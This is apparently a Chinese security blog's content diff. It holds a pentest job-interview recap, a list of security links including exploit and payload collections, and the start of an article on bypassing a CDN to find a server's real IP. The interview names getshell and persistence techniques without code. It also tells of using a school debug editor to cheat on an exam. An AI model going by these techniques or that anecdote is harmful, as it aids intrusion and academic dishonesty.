看能不能挖掘到能够利用的0day或者1day, 然后没有的话就黑盒直接进行测试. 从输入端口, 搜索框或者登录框, 更改密码. 还有像处理订单信息这些地方, 进行一些黑盒的恶意参数输入看有没有反应, 然后再往深入的话就一个数据包一个数据包的查看, 看数据包之间的逻辑联系, 有无逻辑漏洞, 去挖掘一些他业务上的逻辑处理异常的地方, 这是我个人的渗透流程的一个习惯.</p>
+<h2 id="6-你之前遇到过哪些getshell的方法"><a href="#6-你之前遇到过哪些getshell的方法" class="headerlink" title="6. 你之前遇到过哪些getshell的方法"></a>6. 你之前遇到过哪些getshell的方法</h2><p>我: 最方便的方法还是文件上传, 直接传一个webshell上去. 然后的话就是命令执行或者代码执行, 通过执行一段命令, 比如说像 bash 反弹 shell. 也可以弹一个webshell回来. 然后的话还有像是通过存储型XSS获取后台管理员的cookie, 打一个cookie过来获得一个后台管理员的权限, 然后从后台去看有没有通常的文件上传, 然后也能拿到webshell. 然后的话也可以从SQL注入层面, 如果他SQL数据库的权限比较高, 就可以通过Sqlmap直接获取到一个OS的权限一个系统的权限, 常用的就这些比较常见一些</p>
+<h2 id="7-那你能根据你的经验来给我介绍一下怎么样来防范文件上传攻击呢"><a href="#7-那你能根据你的经验来给我介绍一下怎么样来防范文件上传攻击呢" class="headerlink" title="7. 那你能根据你的经验来给我介绍一下怎么样来防范文件上传攻击呢"></a>7. 那你能根据你的经验来给我介绍一下怎么样来防范文件上传攻击呢</h2><p>我: 首先对用户的文件一定要做严格的过滤限制, 黑名单白名单都可以, 就严格限制, 比如说这里是一个图像上传功能, 那么就只允许上传一个img图像不允许上传其它类型的文件, 还有就是存储文件的目录不能暴露给用户, 他如果不知道文件上传到哪去的话他其实也不好利用这个webshell, 然后的话, 文件上传这个目录, 做好权限控制, 这个目录之下的所有文件不允许有执行权限, 这样用户就算传了一个php文件或者asp文件上去也无法执行, 这样这个webshell也是无用的</p>
+<h2 id="8-你能简单的介绍一下-XSS-和-CSRF-的区别吗"><a href="#8-你能简单的介绍一下-XSS-和-CSRF-的区别吗" class="headerlink" title="8. 你能简单的介绍一下 XSS 和 CSRF 的区别吗"></a>8. 你能简单的介绍一下 XSS 和 CSRF 的区别吗</h2><p>我: 通常来说, 有 XSS 一般来说都会伴随着 CSRF, CSRF是一个跨站请求伪造, 他是一个伪造的过程, 比如说你这里有个XSS的话同时还有个CSRF的话你可以利用这个跨站请求伪造去触发这个XSS. 就你伪造了他的用户信息之后, 你再去触发这个XSS, 就相当于是你是用被攻击者的身份去触发的XSS来获取的被攻击者的cookie. 然后XSS的话只是作为攻击者一方用来获取一些客户端的信息, 你如果想用XSS做到事情的话, 更多是用存储型XSS, 才能实际的获取到被攻击者的cookie信息. 如果只是一个self-xss的话一般来说是无害的, 然后CSRF的话通常可以配合XSS来进行组合拳的攻击.</p>
+<p>面试官: 那么针对这两个漏洞有什么修复方案吗, 怎么避免这两个漏洞<br>我: 对于XSS来说, 一劳永逸的方法就是直接html实体化转义, 把用户的输入所有的html标签进行转义, 转成html编码, 如果说有业务需要, 的确需要用户输入html标签, 可以对用户的输入进行白名单过滤, 限制用户只能用相应的标签进行输入, 通常就几个白名单配合使用效果会好一些, 然后像是CSRF也是类似的, 像是黑白名单进行限制, 然后还有就是对用户输入进行验证. </p>
+<h2 id="9-假设说现在有一个页面-里面有一个用户名-还有一个密码-还有一个提交按钮-这个页面只有这三个交互的内容-让你做安检的话-你会从哪些方面去检查这个页面"><a href="#9-假设说现在有一个页面-里面有一个用户名-还有一个密码-还有一个提交按钮-这个页面只有这三个交互的内容-让你做安检的话-你会从哪些方面去检查这个页面" class="headerlink" title="9. 假设说现在有一个页面, 里面有一个用户名, 还有一个密码, 还有一个提交按钮, 这个页面只有这三个交互的内容, 让你做安检的话, 你会从哪些方面去检查这个页面"></a>9. 假设说现在有一个页面, 里面有一个用户名, 还有一个密码, 还有一个提交按钮, 这个页面只有这三个交互的内容, 让你做安检的话, 你会从哪些方面去检查这个页面</h2><p>我: 最大的一头就是SQL注入, 然后就是弱密码, 一般的话这种页面的话没有验证码功能, 那么攻击者可以通过爆破的方式去强行爆破一个用户出来, 所以这个页面最好能再加一个验证功能, 然后SQL注入的话也是在后台进行限制用户的输入或者用预编译对用户的输入进行防范, 其实这个页面我个人还遇到过一些情况, 就是虽然说只有一个登录页面, 但是你可以从url上面你可以更改, 比如说一个 <code>login.php</code> 你可以改成 <code>register.php</code> 这时候他隐藏的注册界面可能也出来了, 也是我平时遇到过比较多的也是一些开发者的疏忽导致的漏洞. </p>
+<h2 id="10-你先知写的那两篇文章我都看过了-你还有其他的有趣经历可以跟我分享一下吗"><a href="#10-你先知写的那两篇文章我都看过了-你还有其他的有趣经历可以跟我分享一下吗" class="headerlink" title="10. 你先知写的那两篇文章我都看过了, 你还有其他的有趣经历可以跟我分享一下吗"></a>10. 你先知写的那两篇文章我都看过了, 你还有其他的有趣经历可以跟我分享一下吗</h2><p>我: 我觉得最有趣的一件事情就是我们几个小伙伴嘛, 就是刚开始接触渗透测试的时候没有目标. 于是我们就对自己的学校进行了一个渗透测试, 当时是在学校挖出了一个SQL注入, 然后还有学校的编程课都是在线考核, 然后那个在线平台是学校软工他们开发的, 然后我们也对他们开发的那个考试平台也做了一些测试, 然后挖到了一个编辑器, 那个编辑器是他们忘了删的, 他们调试用的编辑器, 里面可以上传文件, 可以传一些文件上去, 这个编辑器是不管内网外网都能使用的, 我们考试的时候就把考试的代码提前传到编辑器上面, 然后考试的时候就可以访问那个编辑器然后再把代码下载下来, 这也是信息收集收集到的一些好玩的地方吧, 其实我觉得信息安全这个专业还是挺有意思的, 实用性还是很广泛. 后面这些漏洞都还是提交给校方了</p>
+<h2 id="11-你觉得这套笔试题-难度怎么样-有出的不合适的地方吗"><a href="#11-你觉得这套笔试题-难度怎么样-有出的不合适的地方吗" class="headerlink" title="11. 你觉得这套笔试题, 难度怎么样, 有出的不合适的地方吗"></a>11. 你觉得这套笔试题, 难度怎么样, 有出的不合适的地方吗</h2><p>我: 我觉得笔试题出的都挺合适的, 然后知识面比较广一些什么方向都有, 也有一些不熟的方向还是不太了解</p>
+<h2 id="12-你平时用windows多还是linux多呀"><a href="#12-你平时用windows多还是linux多呀" class="headerlink" title="12. 你平时用windows多还是linux多呀"></a>12. 你平时用windows多还是linux多呀</h2><p>我: 我平时用linux多一点Windows也用过一些, 就分别对应不同的需求都用</p>
+<p>面试官: 嗯好, 你平时主要用哪个发行版本<br>我: linux用ubuntu 16.04, windows根据内网需要的环境不一样各个版本都有用过</p>
+<p>面试官: 你能给我介绍一下linux里面随着系统启动的配置文件, 大概会有哪些地方呢. 说白了就是你藏个马会藏在系统哪里, 随着系统启动<br>我: 额, 藏马会藏在哪, 一般来说额, 日志文件吧. 从web层面传上来的话一般就在www目录下吧, 然后内网横向移动的话可能会藏在一个比较隐蔽的地方有执行权限的一个文件夹下面, 还有一种思路是写到linux进程里面, linux挂载木马</p>
+<p>面试官: 那比如说linux计划任务的配置在哪里你知道吗<br>我: 不是很了解, 能够科普一下吗<br>面试官: 应该有一个叫crontab. 那linux里面服务的配置文件都在哪里, 就是在哪里可以配一个可以开机启动的服务<br>我: Apache的一般在 var/log 下面,<br>面试官: 我说的是怎么把一个服务拉起来, 比如说把 Apache 拉起来<br>我: 这个没有怎么了解过</p>
+<p>面试官: 那比如windows呢, windows同样的, 想把一个木马拉起来的话, 有哪几种方法<br>我: 一种是powershell直接拉起一个, 还有msf传一个木马去获取一个shell, 然后还有就是直接用一些历史的windows漏洞去<br>面试官: 其实我想听的会更简单一点, 你想复杂了. 我想听的其实就是服务, 开机启动, 计划任务. 类似于这些东西.</p>
+<h2 id="13-你平时自己写脚本吗"><a href="#13-你平时自己写脚本吗" class="headerlink" title="13. 你平时自己写脚本吗"></a>13. 你平时自己写脚本吗</h2><p>我: 我平时根据需求会自己写一点, 但通常是用python写, 因为python写起来会更方便一些. Java跟C都停留在语法方面.</p>
+<p>面试官: 你现在主要用哪个版本的python<br>我: 现在 python3.8/python3.9, 然后python2已经淘汰了<br>面试官: 哈哈哈是的</p>
+<p>面试官: 你能找一个你之前写过的python脚本给我介绍一下大概是什么功能, 和常用的函数吗.<br>我: 用python写网页请求, 就用request库发起一个GET请求或者POST请求, 这种脚本我一般写来用来做SQL盲注或者布尔型注入, 写一个for循环然后用python request发包发给服务器, 接收返回值, 判断返回的页面的值有无变化, 然后再进行发包, 直到逐步把数据库名给爆破出来, 就用的最多的就是request库, 还有OS库用来执行系统命令, 平时CTF比较多的是要进行一个web层面的交互嘛, 然后有些时候用burpsuit不是很方便的时候, 用python写一个request库去进行一个交互</p>
+<h2 id="14-关于代码审计方面你接触的多吗"><a href="#14-关于代码审计方面你接触的多吗" class="headerlink" title="14. 关于代码审计方面你接触的多吗"></a>14. 关于代码审计方面你接触的多吗</h2><p>我: 代码审计的话, 我主要接触的是PHP代码审计, 就不知道跟公司业务有没有冲突<br>面试官: 没有冲突哈哈哈哈<br>我: 就我感觉现在公司用的java多一点, 然后java代码审计我最近也在补嘛, 大家现在都改java多了<br>面试官: 你能介绍一下你在php代码审计的一些经验吗<br>我: php代码审计的话, 首先我的思路有四种吧, 第一种是根据特殊函数去查找, 然后反向去找输入点, 去看这个特殊函数有没有输入点去调了这个特殊函数. 还有一种是根据输入点的函数, 根据GET POST输入点去正向追踪这些参数去了哪些地方, 跟着参数走, 看参数有没有经过敏感的一些函数地. 然后还有一种是特殊功能点审计, 去直接审特殊一点的, 比如说 login.php register.php还有直接与数据库交互的php文件直接审, 看有没有漏洞. 还有一种就是根据整体代码进行一个全局的代码审计. 我常用的思路就是这样, 同时还辅助了一些代码审计工具吧, 但现在的代码审计工具通常来说误报还是挺高的, 所以更多的还是需要人工的去判断</p>
+<h2 id="15-之前在你参加的这些CTF比赛里-因为都是以组队的形式嘛-你在你的小队中扮演的是一个什么样的角色"><a href="#15-之前在你参加的这些CTF比赛里-因为都是以组队的形式嘛-你在你的小队中扮演的是一个什么样的角色" class="headerlink" title="15. 之前在你参加的这些CTF比赛里, 因为都是以组队的形式嘛, 你在你的小队中扮演的是一个什么样的角色"></a>15. 之前在你参加的这些CTF比赛里, 因为都是以组队的形式嘛, 你在你的小队中扮演的是一个什么样的角色</h2><p>我: 我在小队里面主要负责两个方向, 一个是web方向, 一个是misc方向. web方向的话一般来说是两个web手, misc方向基本都是我一个人负责</p>
+<p>面试官: 这个有没有比较有趣的经历可以介绍一下<br>我: 有misc方向的话, 因为之前有一段时间web题型太难了有点接受不了了, 就已经学到很累的情况下, 我去做了会儿misc, 就觉得misc相对web来说能轻松一些嘛. 然后misc做多了之后, 有一个师傅就是跟我说要不要去做一个misc的培训, 然后我就愉快的答应了嘛, 然后就去给一些刚入门的CTF选手做misc培训, 当时去的时候足足准备了一百多道misc题目, 然后去讲了三天三夜, 还算挺有趣的故事吧, 也算是把自己学的东西转化成了现实的技术力.<br>面试官: 挺好的哈哈, 能有很好的分享精神<br>我: 还是挺有趣的其实, 杂项有很多类型的题, 像流量分析, 一些linux的系统指令, python的系统指令, 一些图像题, 音频题, 其实很广泛, 可以接触到很多不一样的安全思路吧<br>面试官: 是的, 其实安全这面知识点是比较杂一点</p>
+<h2 id="16-我这里暂时没有什么问题了-看你有什么问题想要问我的吗"><a href="#16-我这里暂时没有什么问题了-看你有什么问题想要问我的吗" class="headerlink" title="16. 我这里暂时没有什么问题了, 看你有什么问题想要问我的吗"></a>16. 我这里暂时没有什么问题了, 看你有什么问题想要问我的吗</h2><p>我: 就是我可以问一下目前在实际的业务当中, 安全问题一般都会怎么处理呢, 对于一个大公司来说<br>面试官: 我们这边的话其实就像你说的, 安全本身比较杂嘛, 我们这边同时管的是线上的业务安全, 线下的包括这种办公环境的安全. 对于我个人来说, 线上的像是游戏服务器其实还好, 不会遇到太明显的安全问题, 游戏服务器最主要的就是cdy就是那种大流量的分布式的, 你应该有听过. 然后网站的话, 不是很多, 其实也有. 网站的话大多数也是我们业务的薄弱点, 就是比如说像你说的注册啊, 还有一些活动的站点啊, 玩家可能刷的道具啊, 这些问题也都有. 然后办公网就比较乱了, 什么情况都有. 基本上我这业务划分就这三块吧</p>
+<p>我: 如果服务器遇到瘫痪的话, 一般是因为什么原因呢, 就我之前我也玩盛趣的游戏嘛, 经常遇到服务器瘫痪的情况<br>面试官: 从玩家角度, 如果服务器访问不了最主要的其实就是cdy和网络问题. 就比如说机房的网和地区性的网络问题<br>我: 就网络波动嘛之类的<br>面试官: 对的, 其实就是最常见的, 95%以上都是这种问题, 然后说真正因为安全问题被攻击的几乎没有, 我们几乎很少见到因为服务器被入侵这种. </p>
+<p>我: 现在公司业务是不是用java多一点<br>面试官: 如果是单纯走web界面的话, 我们公司因为年头比较久了嘛, 然后是以前盛大的. java php asp .net 都有, 混合式的. 因为各个业务的条件可能自己有自己的开发思路嘛, 就技术栈比较不同<br>我: 那这样的话安全问题就更杂了<br>面试官: 是的, 所以我们的考题也出的比较杂, 你可以看得出来, 各种问题都可以遇到</p>
+]]></content>
+      <categories>
+        <category>求职</category>
+      </categories>
+      <tags>
+        <tag>记录</tag>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>码一些网站（长期更新）</title>
+    <url>/2021/08/18/%E7%A0%81%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99/</url>
+    <content><![CDATA[<blockquote>
+<p>记录已经学过的和未学过的知识点。（同时还收藏了一些莫名其妙的东西）<br>已完成的内容将会在地址前打勾<br>我，学，学不完了！</p>
+</blockquote>
+<h2 id="一、大师父们的博客"><a href="#一、大师父们的博客" class="headerlink" title="一、大师父们的博客"></a>一、大师父们的博客</h2><ol>
+<li><input disabled="" type="checkbox"> <a href="http://iamstudy.cnblogs.com/">http://iamstudy.cnblogs.com/</a> 柠檬师父的博客 </li>
+<li><input disabled="" type="checkbox"> <a href="https://cl0und.github.io/">https://cl0und.github.io/</a> 刘师父的博客 </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.leavesongs.com/">https://www.leavesongs.com/</a> 离别歌师父的博客 </li>
+<li><input disabled="" type="checkbox"> <a href="https://bl4ck.in/">https://bl4ck.in/</a> tomato师父的博客 </li>
+<li><input disabled="" type="checkbox"> <a href="https://godot.win/">https://godot.win/</a> Godot师父的博客 </li>
+<li><input disabled="" type="checkbox"> <a href="http://www.k0rz3n.com/">http://www.k0rz3n.com</a> K0rz3n师父的博客</li>
+<li><input disabled="" type="checkbox"> <a href="https://www.iloveflag.com/">https://www.iloveflag.com/</a> iloveflag!</li>
+<li><input disabled="" type="checkbox"> <a href="http://blog.orange.tw/">http://blog.orange.tw/</a> 橘子师父的博客（需要挂代理） </li>
+</ol>
+<p><strong>Ps：更多师父的博客可以通过友链互相跳转</strong> </p>
+<h2 id="二、Github上一些不错的项目"><a href="#二、Github上一些不错的项目" class="headerlink" title="二、Github上一些不错的项目"></a>二、Github上一些不错的项目</h2><h3 id="安全文章"><a href="#安全文章" class="headerlink" title="安全文章"></a>安全文章</h3><ol>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/CHYbeta/Web-Security-Learning">https://github.com/CHYbeta/Web-Security-Learning</a> Web安全大合集</li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a> 从零开始的红队之路</li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a> AD的攻击与防御</li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/Ridter/Intranet_Penetration_Tips">https://github.com/Ridter/Intranet_Penetration_Tips</a> 内网渗透Tips</li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections">https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections</a> APT和网络犯罪活动的收集</li>
+</ol>
+<h3 id="exp合集"><a href="#exp合集" class="headerlink" title="exp合集"></a>exp合集</h3><ol>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a> linux-kernel-exploits Linux平台提权漏洞集合 </li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a> 超大的payload合集</li>
+</ol>
+<h3 id="靶场相关"><a href="#靶场相关" class="headerlink" title="靶场相关"></a>靶场相关</h3><ol>
+<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a> phith0n师父的一个面向大众的开源漏洞靶场</li>
+<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a> sqli-labs 经典的练习SQL注入的靶场 </li>
+<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a> DVWA 经典的基础漏洞的练习靶场</li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/wonderkun/CTF_web">https://github.com/wonderkun/CTF_web</a> 一个CTF的web项目</li>
+</ol>
+<h3 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h3><ol>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a> 超经典的SQL注入工具</li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a> 脚本调用框架，用于渗透测试中 采集|爬虫|爆破|批量PoC 等需要并发的任务。 </li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/Hecbi/awd_auto_attack">https://github.com/Hecbi/awd_auto_attack</a> 一个自动化写入php不死马/进程守护马，批量获得flag的线下赛工具 </li>
+</ol>
+<h3 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h3><ol>
+<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/komeiji-satori/Dress">https://github.com/komeiji-satori/Dress</a> 女装项目 </li>
+<li><input checked="" disabled="" type="checkbox"> <a href="https://github.com/StylishThemes/GitHub-Dark">https://github.com/StylishThemes/GitHub-Dark</a> 黑暗风格的github</li>
+</ol>
+<h2 id="三、CTF相关"><a href="#三、CTF相关" class="headerlink" title="三、CTF相关"></a>三、CTF相关</h2><ol>
+<li><input disabled="" type="checkbox"> <a href="https://www.leavesongs.com/PENETRATION/xss-collect.html">https://www.leavesongs.com/PENETRATION/xss-collect.html</a> XSS的一些绕过方法 </li>
+<li><input disabled="" type="checkbox"> <a href="https://blog.csdn.net/u011377996/article/details/80787236">https://blog.csdn.net/u011377996/article/details/80787236</a> 安恒杯6月wp </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.anquanke.com/post/id/164569">https://www.anquanke.com/post/id/164569</a> LCTF wp </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.freebuf.com/articles/web/118149.html">https://www.freebuf.com/articles/web/118149.html</a> CTF搅屎指南 </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.codercto.com/a/41228.html?tdsourcetag=s_pctim_aiomsg">https://www.codercto.com/a/41228.html?tdsourcetag=s_pctim_aiomsg</a> NCTF部分题解</li>
+<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/2308">https://xz.aliyun.com/t/2308</a> 用python继承链搞事情</li>
+<li><input disabled="" type="checkbox"> <a href="http://www.cnblogs.com/Vinson404/p/7253255.html">http://www.cnblogs.com/Vinson404/p/7253255.html</a> SQL注入绕过</li>
+<li><input disabled="" type="checkbox"> <a href="https://michaelwayneliu.github.io/2017/12/21/SOME%E6%94%BB%E5%87%BB/">https://michaelwayneliu.github.io/2017/12/21/SOME%E6%94%BB%E5%87%BB/</a> SOME攻击</li>
+<li><input disabled="" type="checkbox"> <a href="https://www.anquanke.com/post/id/159206">https://www.anquanke.com/post/id/159206</a> 四个实例递进php反序列化漏洞理解  </li>
+</ol>
+<h3 id="关于SQL注入中的Unicode安全，顺序浏览"><a href="#关于SQL注入中的Unicode安全，顺序浏览" class="headerlink" title="关于SQL注入中的Unicode安全，顺序浏览"></a>关于SQL注入中的Unicode安全，顺序浏览</h3><ul>
+<li><input disabled="" type="checkbox"> <a href="https://skysec.top/2018/03/21/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E6%B7%B1%E5%85%A5mysql%E5%AD%97%E7%AC%A6%E9%9B%86%E4%B8%8E%E6%AF%94%E5%AF%B9%E6%96%B9%E6%B3%95collation/">从一道题深入mysql字符集与比对方法collation</a></li>
+<li><input disabled="" type="checkbox"> <a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html">Collation chart for utf8_general_ci</a> </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">Mysql字符编码利用技巧 </a></li>
+</ul>
+<h3 id="巧用LD-PRELOAD突破disable-functions"><a href="#巧用LD-PRELOAD突破disable-functions" class="headerlink" title="巧用LD_PRELOAD突破disable_functions"></a>巧用LD_PRELOAD突破disable_functions</h3><ul>
+<li><input disabled="" type="checkbox"> <a href="https://www.anquanke.com/post/id/175403">1. 深入浅出LD_PRELOAD &amp; putenv()</a> </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.freebuf.com/articles/web/192052.html">2. 无需sendmail：巧用LD_PRELOAD突破disable_functions</a> </li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">3. bypass disable_functions via LD_PRELOAD</a> </li>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/AntSwordProject/ant_php_extension">4. Ant PHP Extension</a> </li>
+</ul>
+<h3 id="fpm绕过disable-functions"><a href="#fpm绕过disable-functions" class="headerlink" title="fpm绕过disable_functions"></a>fpm绕过disable_functions</h3><ul>
+<li><input disabled="" type="checkbox"> <a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">1. Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a> </li>
+<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/5598">2. 浅析php-fpm的攻击方式</a></li>
+<li><input disabled="" type="checkbox"> <a href="https://evoa.me/index.php/archives/52/">3. PHP 连接方式&amp;攻击PHP-FPM&amp;*CTF echohub WP</a> </li>
+</ul>
+<h2 id="四、一些值得学习的好文章"><a href="#四、一些值得学习的好文章" class="headerlink" title="四、一些值得学习的好文章"></a>四、一些值得学习的好文章</h2><ol>
+<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/128">https://xz.aliyun.com/t/128</a> 浅析自动绑定漏洞</li>
+<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a> Linux 反弹shell（一）文件描述符与重定向</li>
+<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a> Linux 反弹shell（二）反弹shell的本质</li>
+<li><input disabled="" type="checkbox"> <a href="https://www.cnblogs.com/xiaozi/p/12963549.html">https://www.cnblogs.com/xiaozi/p/12963549.html</a> 绕过CDN查找真实IP</li>
+</ol>
+<h2 id="五、资料库"><a href="#五、资料库" class="headerlink" title="五、资料库"></a>五、资料库</h2><ol>
+<li><input disabled="" type="checkbox"> <a href="https://www.securityfocus.com/">https://www.securityfocus.com/</a> Bugtraq SecurityFocus </li>
+<li><input disabled="" type="checkbox"> <a href="https://packetstormsecurity.com/">https://packetstormsecurity.com</a> Packet Storm</li>
+<li><input disabled="" type="checkbox"> <a href="https://www.seebug.org/">https://www.seebug.org/</a> Seebug</li>
+<li><input disabled="" type="checkbox"> <a href="http://www.anquan.us/">http://www.anquan.us/</a> 乌云镜像站 </li>
+<li><input disabled="" type="checkbox"> <a href="https://wizardforcel.gitbooks.io/web-hacking-101/content/">https://wizardforcel.gitbooks.io/web-hacking-101/content/</a> 实战案例</li>
+<li><input disabled="" type="checkbox"> <a href="https://xz.aliyun.com/t/2231">https://xz.aliyun.com/t/2231</a> 安全帮－零基础web安全学习终极攻略</li>
+<li><input disabled="" type="checkbox"> <a href="https://portswigger.net/web-security/dashboard">https://portswigger.net/web-security/dashboard</a>  burp学院，最适合新手入门的指导资料</li>
+</ol>
+<h2 id="六、杂"><a href="#六、杂" class="headerlink" title="六、杂"></a>六、杂</h2><ol>
+<li><input checked="" disabled="" type="checkbox"> <a href="https://blog.coding.net/blog/CS-Hexo">https://blog.coding.net/blog/CS-Hexo</a> Hexo搭建博客 </li>
+<li><input disabled="" type="checkbox"> <a href="https://50-jahre-hitparade.ch/">https://50-jahre-hitparade.ch/</a> 好玩的网站 </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.cnblogs.com/zhangziqiang/p/7478075.html">https://www.cnblogs.com/zhangziqiang/p/7478075.html</a> Linux Shell常用shell命令 </li>
+<li><input disabled="" type="checkbox"> <a href="http://tour.ubuntu.com/zh-CN/#surf-the-web">http://tour.ubuntu.com/zh-CN/#surf-the-web</a> 在线ubuntu虚拟机 </li>
+<li><input disabled="" type="checkbox"> <a href="https://www.jianshu.com/p/444883157618">https://www.jianshu.com/p/444883157618</a> java两天速成</li>
+</ol>
+]]></content>
+      <categories>
+        <category>学习资源</category>
+      </categories>
+      <tags>
+        <tag>学习资源</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>绕过CDN寻找网站真实IP</title>
+    <url>/2021/09/17/%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9EIP/</url>
+    <content><![CDATA[<h2 id="一-什么是CDN-为什么要绕过CDN"><a href="#一-什么是CDN-为什么要绕过CDN" class="headerlink" title="一. 什么是CDN, 为什么要绕过CDN"></a>一. 什么是CDN, 为什么要绕过CDN</h2><h3 id="什么是CDN以及CDN加速"><a href="#什么是CDN以及CDN加速" class="headerlink" title="什么是CDN以及CDN加速?"></a>什么是CDN以及CDN加速?</h3><p>CDN全称是(Content Delivery Network), 即内容分发网络. CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p>
+<h3 id="CDN对网站有什么好处"><a href="#CDN对网站有什么好处" class="headerlink" title="CDN对网站有什么好处?"></a>CDN对网站有什么好处?</h3><p>首先，开启CDN后的网站，会根据用户所在地的不同访问CDN的节点服务器，并不直接访问源服务器，这样可以减少网站服务器宽带资源,降低服务器压力。这也就是大家都在ping百度,但是不同地区得到的反馈ip不一样的原因。</p>
+<p>其次，由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。</p>
+<h3 id="为什么我们需要绕过CDN"><a href="#为什么我们需要绕过CDN" class="headerlink" title="为什么我们需要绕过CDN?"></a>为什么我们需要绕过CDN?</h3><p>对于我们渗透测试者来说，我们在信息收集中重要的一步就是要得到目标服务器主机的<strong>真实IP地址</strong>，但如果目标服务器部署了CDN服务，那么往往我们直接访问得到的IP只是CDN节点服务器的IP，而不是真实的源服务器的IP地址，这是就需要我们想办法绕过CDN获取源服务器IP。</p>
+<h2 id="二-验证是否存在CDN"><a href="#二-验证是否存在CDN" class="headerlink" title="二. 验证是否存在CDN"></a>二. 验证是否存在CDN</h2><h3 id="1-多地Ping查询"><a href="#1-多地Ping查询" class="headerlink" title="1. 多地Ping查询"></a>1. 多地Ping查询</h3><p>使用不同区域ping，查看ping的ip结果是否唯一。若不唯一，则目标网站可能存在CDN。</p>
+<p>多地ping网站: </p>
+<ul>
+<li><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></li>
+<li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></li>
+<li><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></li>
+</ul>
+<h3 id="2-nslookup"><a href="#2-nslookup" class="headerlink" title="2. nslookup"></a>2. nslookup</h3><p>原理同上, 如果返回域名解析对应多个IP地址多半是使用了CDN. </p>
+<p>有CDN的示例 </p>
+<img src="/2021/09/17/%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9EIP/qun9EBu.png" class="">
+
+<p>无CDN的示例:</p>
+<img src="/2021/09/17/%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9EIP/mm6XPZb.png" class="">
+
+
+<h3 id="3-使用工具直接查询"><a href="#3-使用工具直接查询" class="headerlink" title="3. 使用工具直接查询"></a>3. 使用工具直接查询</h3><p>参考如下网站</p>
+<ul>
+<li><a href="http://www.cdnplanet.com/tools/cdnfinder/">http://www.cdnplanet.com/tools/cdnfinder/</a></li>
+<li><a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a></li>
+</ul>
